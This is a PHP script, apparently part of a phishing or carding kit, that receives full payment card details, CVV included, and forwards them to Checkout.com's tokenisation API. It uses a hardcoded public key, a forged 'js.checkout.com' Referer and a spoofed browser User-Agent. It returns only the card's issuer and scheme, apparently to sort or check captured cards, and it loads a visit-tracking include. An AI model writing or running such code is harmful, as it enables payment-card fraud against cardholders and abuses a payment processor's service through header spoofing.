<?php require_once __DIR__ . '/visit_handler.php'; ?>
<?php

function make_safe($variable) {
    $variable = strip_tags(trim($variable));
    return $variable; 
}

// Obtener los datos de la tarjeta desde el POST
$data = json_decode(file_get_contents("php://input"), true);

// Validar si los datos requeridos están presentes
if (!isset($data['number'], $data['expiry_month'], $data['expiry_year'], $data['cvv'], $data['name'], $data['billing_address']['country'])) {
    echo json_encode(['error' => 'Faltan datos necesarios']);
    exit;
}

$cc = make_safe($data['number']); // Número completo de la tarjeta
$expiry_month = make_safe($data['expiry_month']);
$expiry_year = make_safe($data['expiry_year']);
$cvv = make_safe($data['cvv']);
$name = make_safe($data['name']);
$country = make_safe($data['billing_address']['country']);

// Preparar los datos para la API de Checkout
$vars = json_encode([
    "type" => "card",
    "number" => $cc,
    "expiry_month" => $expiry_month,
    "expiry_year" => $expiry_year,
    "cvv" => $cvv,
    "name" => $name,
    "billing_address" => ["country" => $country],
    "phone" => new stdClass()
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.checkout.com/tokens");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$headers = [
    'Authorization: pk_fsvy4jjhsxspccdluk4cj4bqsmf',
    'Content-Type: application/json',
    'Referer: https://js.checkout.com/',
    'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
curl_close($ch);

if (!$response) {
    echo json_encode(['error' => 'No se pudo conectar con la API']);
    exit;
}

$data = json_decode($response, true);

// Validar que se ha recibido la información correcta
if (isset($data['issuer'], $data['scheme'])) {
    $issuer = $data['issuer'];
    $scheme = $data['scheme'];

    echo json_encode(['issuer' => $issuer, 'scheme' => $scheme]);
} else {
    echo json_encode(['error' => 'Datos incompletos recibidos de la API']);
}
